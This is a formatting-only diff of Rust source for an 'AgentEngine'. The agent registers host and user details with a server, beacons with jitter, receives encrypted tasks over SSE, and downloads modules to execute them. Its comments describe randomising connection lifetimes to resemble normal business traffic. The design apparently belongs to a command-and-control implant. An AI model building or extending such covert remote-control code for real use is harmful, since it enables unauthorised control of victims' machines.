@@ -1,11 +1,11 @@
-use serde_json::Value;
 use rand::Rng;
+use serde_json::Value;
 
-use libra_crypto::AgentCrypto;
 use libra_comm::http::HttpCommunicator;
+use libra_crypto::AgentCrypto;
 
 use crate::config::ConfigManager;
-use crate::engine::heartbeat::{heartbeat_tick, handle_task, jittered_interval};
+use crate::engine::heartbeat::{handle_task, heartbeat_tick, jittered_interval};
 use crate::module_manager::ModuleManager;
 
 mod heartbeat;
@@ -34,7 +34,9 @@ impl AgentEngine {
         }
     }
 
-    pub fn agent_id(&self) -> &str { &self.agent_id }
+    pub fn agent_id(&self) -> &str {
+        &self.agent_id
+    }
 
     // ── Main entry point ─────────────────────────────────────────────
 
@@ -108,13 +110,18 @@ impl AgentEngine {
         let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
         let arch = sys["arch"].as_str().unwrap_or("unknown");
 
-        let outcome = http.register(
-            hostname, user_name, os_version, arch,
-            self.crypto.rsa_public_key().unwrap_or(""),
-            &self.config.beacon_secret,
-            &hw_json,
-            self.crypto.session_key().is_some(),
-        ).await?;
+        let outcome = http
+            .register(
+                hostname,
+                user_name,
+                os_version,
+                arch,
+                self.crypto.rsa_public_key().unwrap_or(""),
+                &self.config.beacon_secret,
+                &hw_json,
+                self.crypto.session_key().is_some(),
+            )
+            .await?;
 
         let agent_id = outcome.agent_id;
         let session_key = outcome.session_key;
@@ -144,7 +151,11 @@ impl AgentEngine {
             libra_common::dlog!("[WARN] Server did not return a session key (encryption disabled)");
         }
 
-        libra_common::dlog!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
+        libra_common::dlog!(
+            "[INFO] registered | agent_id={} | hostname={}",
+            agent_id,
+            hostname
+        );
         self.agent_id = agent_id;
         self.http = Some(http);
 
@@ -167,12 +178,15 @@ impl AgentEngine {
 
         // Cloud module manager — downloads modules on demand (shared with the
         // heartbeat task that executes one-shot tasks).
-        let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
-            ModuleManager::new(
-                &server_url, &register_path, &register_path, &register_path,
-                agent_id.clone(), hb_key, Some(session_token.clone()),
-            ),
-        ));
+        let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(ModuleManager::new(
+            &server_url,
+            &register_path,
+            &register_path,
+            &register_path,
+            agent_id.clone(),
+            hb_key,
+            Some(session_token.clone()),
+        )));
 
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
         // with the session key, with per-tick jitter. Signals a re-register if
@@ -187,7 +201,12 @@ impl AgentEngine {
         let hb_session_token = session_token.clone();
         let hb_profile = profile.clone();
         tokio::spawn(async move {
-            let mut hb_http = HttpCommunicator::new(&hb_server_url, &hb_register_path, &hb_register_path, &hb_register_path);
+            let mut hb_http = HttpCommunicator::new(
+                &hb_server_url,
+                &hb_register_path,
+                &hb_register_path,
+                &hb_register_path,
+            );
             if !hb_session_token.is_empty() {
                 hb_http.set_session_token(hb_session_token);
             }
@@ -225,7 +244,12 @@ impl AgentEngine {
         let sse_key = hb_key; // Option<[u8;32]> Copy
         tokio::spawn(async move {
             use futures_util::StreamExt;
-            let mut sse_http = HttpCommunicator::new(&sse_server_url, &sse_register_path, &sse_register_path, &sse_register_path);
+            let mut sse_http = HttpCommunicator::new(
+                &sse_server_url,
+                &sse_register_path,
+                &sse_register_path,
+                &sse_register_path,
+            );
             if !sse_session_token.is_empty() {
                 sse_http.set_session_token(sse_session_token);
             }
@@ -234,14 +258,17 @@ impl AgentEngine {
             }
             let sse_http = std::sync::Arc::new(sse_http);
             loop {
-                match sse_http.open_events(sse_key.as_ref().unwrap_or(&[0u8; 32])).await {
+                match sse_http
+                    .open_events(sse_key.as_ref().unwrap_or(&[0u8; 32]))
+                    .await
+                {
                     Ok(resp) => {
                         let mut stream = resp.bytes_stream();
                         let mut buf: Vec<u8> = Vec::with_capacity(4096);
                         // 有界连接生命周期（5-15 分钟随机）：长连接有固定暴露窗口，
                         // 主动轮换更接近"短会话"业务行为，也避免连接泄漏累积。
-                        let lifetime = std::time::Duration::from_secs(
-                            rand::thread_rng().gen_range(300..=900));
+                        let lifetime =
+                            std::time::Duration::from_secs(rand::thread_rng().gen_range(300..=900));
                         let start = std::time::Instant::now();
                         loop {
                             let remaining = lifetime.saturating_sub(start.elapsed());
@@ -258,7 +285,9 @@ impl AgentEngine {
                                 Ok(None) => break,
                                 Err(_) => {
                                     // lifetime 到期：主动轮换连接
-                                    libra_common::dlog!("[sse] session lifetime reached — rotating");
+                                    libra_common::dlog!(
+                                        "[sse] session lifetime reached — rotating"
+                                    );
                                     break;
                                 }
                             }
@@ -272,21 +301,38 @@ impl AgentEngine {
                                     if cipher.is_empty() {
                                         continue;
                                     }
-                                    match libra_crypto::decrypt_payload(cipher, sse_key.as_ref().unwrap_or(&[0u8; 32])) {
+                                    match libra_crypto::decrypt_payload(
+                                        cipher,
+                                        sse_key.as_ref().unwrap_or(&[0u8; 32]),
+                                    ) {
                                         Ok(plain) => {
                                             if let Ok(v) = serde_json::from_str::<Value>(&plain) {
                                                 if v["op"].as_str() == Some("task") {
-                                                    match serde_json::from_value::<libra_common::models::AgentTask>(v["data"].clone()) {
+                                                    match serde_json::from_value::<
+                                                        libra_common::models::AgentTask,
+                                                    >(
+                                                        v["data"].clone()
+                                                    ) {
                                                         Ok(task) => {
                                                             // 并发执行：长任务（模块下载/执行）不阻塞后续任务。
                                                             let h = sse_http.clone();
                                                             let mm2 = sse_mm.clone();
                                                             let aid = sse_agent_id.clone();
                                                             tokio::spawn(async move {
-                                                                handle_task(&h, &task, &aid, sse_key.as_ref(), &mm2).await;
+                                                                handle_task(
+                                                                    &h,
+                                                                    &task,
+                                                                    &aid,
+                                                                    sse_key.as_ref(),
+                                                                    &mm2,
+                                                                )
+                                                                .await;
                                                             });
                                                         }
-                                                        Err(e) => libra_common::dlog!("[sse] task parse failed: {e} | raw={}", v["data"].to_string()),
+                                                        Err(e) => libra_common::dlog!(
+                                                            "[sse] task parse failed: {e} | raw={}",
+                                                            v["data"].to_string()
+                                                        ),
                                                     }
                                                 }
                                             }
